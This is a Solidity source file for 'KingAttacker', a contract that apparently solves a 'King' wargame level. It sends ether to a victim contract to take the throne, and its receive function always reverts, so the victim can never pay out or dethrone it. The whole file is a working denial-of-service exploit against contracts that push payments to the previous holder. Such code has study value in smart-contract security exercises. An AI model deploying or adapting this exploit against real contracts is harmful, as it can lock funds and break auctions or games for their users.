// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./King.sol";

contract KingAttacker {
    function attack(address payable _victim) external payable {
        (bool success, ) = _victim.call{value: msg.value}("");
        require(success, "Becoming King unsuccesful");
    }

    receive() external payable {
        revert("I am the King!");
    }
}
